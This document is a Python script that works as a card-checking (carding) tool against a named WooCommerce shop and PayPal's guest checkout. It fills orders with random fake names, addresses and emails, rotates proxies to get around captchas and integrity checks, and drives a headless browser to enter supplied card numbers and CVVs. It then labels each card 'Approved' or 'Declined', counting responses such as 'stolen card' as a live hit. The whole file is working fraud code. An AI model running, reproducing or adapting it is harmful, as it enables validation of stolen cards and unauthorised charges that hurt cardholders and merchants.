import httpx
import asyncio
import random
import string
import re
import json
import time
import os
import logging

logger = logging.getLogger("ppnormal")

SITE_URL = "https://switchupcb.com"
PAYPAL_GQL = "https://www.paypal.com/graphql"

SITE_TIMEOUT = 15
PAYPAL_TIMEOUT = 15

PROXY_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "proxy.txt")

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
]


def _ua():
    return random.choice(UA_LIST)


def _random_email():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=15)) + "@gmail.com"


def _random_name():
    first = ["James", "John", "Michael", "William", "David", "Robert", "Thomas", "Charles", "Chris", "Daniel",
             "Matthew", "Anthony", "Joseph", "Andrew", "Ryan", "Kevin", "Brian", "Steven", "Mark", "Edward"]
    last = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Wilson", "Anderson",
            "Taylor", "Thomas", "Moore", "Martin", "Jackson", "Thompson", "White", "Harris", "Clark", "Lewis"]
    return random.choice(first), random.choice(last)


def _random_address():
    data = [
        ("123 Main St", "New York", "NY", "10001"),
        ("456 Oak Ave", "Los Angeles", "CA", "90001"),
        ("789 Pine Rd", "Chicago", "IL", "60601"),
        ("321 Elm St", "Houston", "TX", "77001"),
        ("654 Maple Dr", "Phoenix", "AZ", "85001"),
        ("111 Cedar Ln", "Seattle", "WA", "98101"),
        ("222 Birch Ct", "Denver", "CO", "80201"),
        ("333 Walnut Way", "Atlanta", "GA", "30301"),
        ("444 Spruce Blvd", "Miami", "FL", "33101"),
        ("555 Ash Pl", "Boston", "MA", "02101"),
        ("666 River Dr", "Portland", "OR", "97201"),
        ("777 Lake Rd", "Dallas", "TX", "75201"),
        ("888 Hill St", "San Diego", "CA", "92101"),
        ("999 Valley Ave", "San Jose", "CA", "95101"),
        ("100 Beach Blvd", "Tampa", "FL", "33601"),
    ]
    return random.choice(data)


def _get_global_proxy():
    try:
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, "r") as f:
                lines = [l.strip() for l in f if l.strip()]
            if lines:
                raw = random.choice(lines)
                parts = raw.split(":")
                if len(parts) == 4:
                    host, port, user, pwd = parts
                    return f"http://{user}:{pwd}@{host}:{port}"
                elif len(parts) == 2:
                    return f"http://{parts[0]}:{parts[1]}"
    except Exception:
        pass
    return None


async def ppnormal_check(cc, mm, yy, cvv, proxy=None):
    start = time.time()

    if len(yy) == 2:
        exp_date = f"{mm}/20{yy}"
    else:
        exp_date = f"{mm}/{yy}"
    mm = mm.zfill(2)

    first, last = _random_name()
    street, city, state, zipcode = _random_address()
    email = _random_email()
    phone = "303" + "".join(random.choices(string.digits, k=7))
    ua = _ua()

    working_proxy = None
    global_proxy = _get_global_proxy()
    candidates = []
    if proxy:
        candidates.append(proxy)
    if global_proxy and global_proxy != proxy:
        candidates.append(global_proxy)
    for p in candidates:
        try:
            async with httpx.AsyncClient(proxy=p, timeout=httpx.Timeout(3, connect=3), verify=False) as test_client:
                await test_client.head(SITE_URL, follow_redirects=True)
            working_proxy = p
            break
        except Exception:
            continue

    order_id = None
    last_error = None

    client_kwargs = dict(
        timeout=httpx.Timeout(SITE_TIMEOUT),
        max_redirects=10,
        headers={"User-Agent": ua},
        verify=False,
        follow_redirects=True,
    )
    if working_proxy:
        client_kwargs["proxy"] = working_proxy

    try:
        async with httpx.AsyncClient(**client_kwargs) as client:
            r_cart = await client.post(
                f"{SITE_URL}/shop/i-buy/",
                data={"add-to-cart": "4451", "quantity": "1"},
            )
            if r_cart.status_code not in (200, 301, 302):
                last_error = f"Cart failed ({r_cart.status_code})"

            if not last_error:
                r_checkout = await client.get(f"{SITE_URL}/checkout/")
                if r_checkout.status_code != 200:
                    last_error = f"Checkout failed ({r_checkout.status_code})"

            if not last_error:
                text = r_checkout.text
                create_nonce_m = re.search(r'create_order.*?nonce":"([^"]+)"', text)
                checkout_nonce_m = re.search(r'name="woocommerce-process-checkout-nonce" value="([^"]+)"', text)

                if not create_nonce_m or not checkout_nonce_m:
                    last_error = "Could not get checkout nonces"

            if not last_error:
                create_nonce = create_nonce_m.group(1)
                checkout_nonce = checkout_nonce_m.group(1)

                payload = {
                    "nonce": create_nonce,
                    "bn_code": "Woo_PPCP",
                    "context": "checkout",
                    "order_id": "0",
                    "payment_method": "ppcp-gateway",
                    "funding_source": "card",
                    "form_encoded": (
                        f"billing_first_name={first}&billing_last_name={last}"
                        f"&billing_country=US&billing_address_1={street}"
                        f"&billing_city={city}&billing_state={state}"
                        f"&billing_postcode={zipcode}&billing_phone={phone}"
                        f"&billing_email={email}&payment_method=ppcp-gateway"
                        f"&terms=on&woocommerce-process-checkout-nonce={checkout_nonce}"
                    ),
                }

                r_order = await client.post(
                    f"{SITE_URL}/?wc-ajax=ppc-create-order",
                    json=payload,
                    headers={
                        "Content-Type": "application/json",
                        "Referer": f"{SITE_URL}/checkout/",
                    },
                )

                try:
                    order_data = r_order.json()
                except Exception:
                    last_error = "Invalid order response"

            if not last_error:
                order_id = order_data.get("data", {}).get("id")
                if not order_id:
                    err_msg = order_data.get("data", {}).get("message", "")
                    last_error = f"No order ID: {err_msg[:50]}" if err_msg else "Could not create PayPal order"

    except (httpx.ConnectTimeout, httpx.ReadTimeout, httpx.WriteTimeout, httpx.PoolTimeout):
        last_error = "Site timeout"
    except httpx.ConnectError:
        last_error = "Connection refused"
    except httpx.NetworkError:
        last_error = "Network error"
    except Exception as e:
        last_error = str(e)[:60]

    if not order_id:
        elapsed = round(time.time() - start, 2)
        return f"Error - {last_error or 'Site unreachable'} [{elapsed}s]"

    # Use Playwright to submit card via PayPal checkout page
    try:
        from playwright.async_api import async_playwright
    except ImportError:
        elapsed = round(time.time() - start, 2)
        return f"Error - Playwright not installed [{elapsed}s]"

    pp_proxy = working_proxy or _get_global_proxy()

    try:
        async with async_playwright() as p:
            launch_args = ["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage", "--disable-gpu"]
            browser = await p.chromium.launch(headless=True, args=launch_args)

            context_kwargs = {
                "user_agent": ua,
                "viewport": {"width": 1280, "height": 720},
            }
            if pp_proxy:
                context_kwargs["proxy"] = {"server": pp_proxy}

            context = await browser.new_context(**context_kwargs)
            page = await context.new_page()

            # Capture PayPal API responses
            captured_result = [None]
            async def on_response(response):
                url = response.url
                if "paypal.com/graphql" in url and "fetch_credit_form_submit" in url:
                    try:
                        body = await response.text()
                        captured_result[0] = body
                    except:
                        pass

            page.on("response", on_response)

            # Load PayPal checkout page for this order
            pp_url = f"https://www.paypal.com/checkoutnow?token={order_id}"
            try:
                await page.goto(pp_url, wait_until="domcontentloaded", timeout=20000)
                await page.wait_for_timeout(3000)
            except Exception:
                elapsed = round(time.time() - start, 2)
                await browser.close()
                return f"Error - PayPal page load failed [{elapsed}s]"

            # Check for captcha
            page_url = page.url
            if "captcha" in page_url.lower() or "geo.ddc" in page_url.lower():
                await browser.close()
                elapsed = round(time.time() - start, 2)
                return f"Error - PayPal Captcha (use proxy) [{elapsed}s]"

            # Look for "Pay with Debit or Credit Card" link
            card_clicked = False
            for selector in [
                'a[data-testid="pay-with-card-link"]',
                'text=Debit or Credit Card',
                'text=Pay with card',
                'button[data-testid="pay-with-card"]',
                '#pay-with-card',
            ]:
                try:
                    el = await page.wait_for_selector(selector, timeout=3000)
                    if el:
                        await el.click()
                        await page.wait_for_timeout(2000)
                        card_clicked = True
                        break
                except:
                    continue

            if not card_clicked:
                await browser.close()
                elapsed = round(time.time() - start, 2)
                return f"Error - No card option on PayPal page [{elapsed}s]"

            # Fill card fields in the PayPal page
            try:
                # Card number
                card_input = await page.wait_for_selector('input[name="cardNumber"], input[data-testid="card-number-input"], #cardNumber', timeout=5000)
                if card_input:
                    await card_input.fill(cc)
                    await page.wait_for_timeout(500)

                    # Expiry
                    exp_input = await page.query_selector('input[name="cardExpiry"], input[data-testid="expiry-date-input"], #cardExpiry')
                    if exp_input:
                        await exp_input.fill(f"{mm}/{yy}")
                        await page.wait_for_timeout(500)

                    # CVV
                    cvv_input = await page.query_selector('input[name="cardCvv"], input[data-testid="cvv-input"], #cardCvv')
                    if cvv_input:
                        await cvv_input.fill(cvv)
                        await page.wait_for_timeout(500)

                    # Name
                    name_input = await page.query_selector('input[name="nameOnCard"], input[data-testid="name-on-card"], #nameOnCard')
                    if name_input:
                        await name_input.fill(f"{first} {last}")

                    # Submit
                    pay_btn = await page.query_selector('button[data-testid="submit-payment"], #submit-payment, button[type="submit"]')
                    if pay_btn:
                        await pay_btn.click()
                        await page.wait_for_timeout(10000)

            except Exception as e:
                elapsed = round(time.time() - start, 2)
                await browser.close()
                return f"Error - Card fill failed: {str(e)[:40]} [{elapsed}s]"

            # Check captured result
            elapsed = round(time.time() - start, 2)
            if captured_result[0]:
                try:
                    result = json.loads(captured_result[0])
                    txt = json.dumps(result).lower()

                    if "is3dsecurerequired" in txt:
                        flags = result.get("data", {}).get("approveGuestPaymentWithCreditCard", {}).get("flags", {})
                        if flags.get("is3DSecureRequired"):
                            await browser.close()
                            return f"Approved - 3DS Required | {cc[:6]} [{elapsed}s]"
                        await browser.close()
                        return f"Approved - Charged $1 | {cc[:6]} [{elapsed}s]"

                    live_indicators = ["insufficient_funds", "do_not_honor", "lost_card", "stolen_card", "pickup_card", "restricted_card", "card_velocity_exceeded"]
                    for indicator in live_indicators:
                        if indicator in txt:
                            tag = indicator.replace("_", " ").title()
                            await browser.close()
                            return f"Approved - {tag} | {cc[:6]} [{elapsed}s]"

                    if "incorrect_cvv" in txt or "invalid_security_code" in txt or "cvv2_failure" in txt:
                        await browser.close()
                        return f"Approved - CCN Live (CVV) | {cc[:6]} [{elapsed}s]"

                    errors = result.get("errors", [])
                    if errors:
                        msg = errors[0].get("message", "Unknown")
                        err_data = errors[0].get("data", [])
                        if isinstance(err_data, list) and err_data:
                            code = err_data[0].get("code", "")
                            if code:
                                if code in ("INSUFFICIENT_FUNDS", "CVV2_FAILURE", "INVALID_SECURITY_CODE"):
                                    await browser.close()
                                    return f"Approved - {code} | {cc[:6]} [{elapsed}s]"
                                await browser.close()
                                return f"Declined - {code} | {cc[:6]} [{elapsed}s]"
                        if "integrity" in msg.lower():
                            await browser.close()
                            return f"Declined - PayPal Integrity Check (use proxy) | {cc[:6]} [{elapsed}s]"
                        await browser.close()
                        return f"Declined - {msg[:60]} | {cc[:6]} [{elapsed}s]"

                    data = result.get("data", {})
                    approve = data.get("approveGuestPaymentWithCreditCard")
                    if approve is not None:
                        await browser.close()
                        return f"Approved - Charged $1 | {cc[:6]} [{elapsed}s]"
                except:
                    pass

            # Check page for success/error
            body_text = await page.evaluate("() => document.body ? document.body.innerText : ''")
            body_lower = body_text.lower()
            await browser.close()

            if "thank you" in body_lower or "payment complete" in body_lower or "order confirmed" in body_lower:
                return f"Approved - Charged $1 | {cc[:6]} [{elapsed}s]"
            if "3d secure" in body_lower or "3ds" in body_lower:
                return f"Approved - 3DS Required | {cc[:6]} [{elapsed}s]"

            return f"Declined - Unknown Response | {cc[:6]} [{elapsed}s]"

    except Exception as e:
        elapsed = round(time.time() - start, 2)
        return f"Error - {str(e)[:80]} [{elapsed}s]"
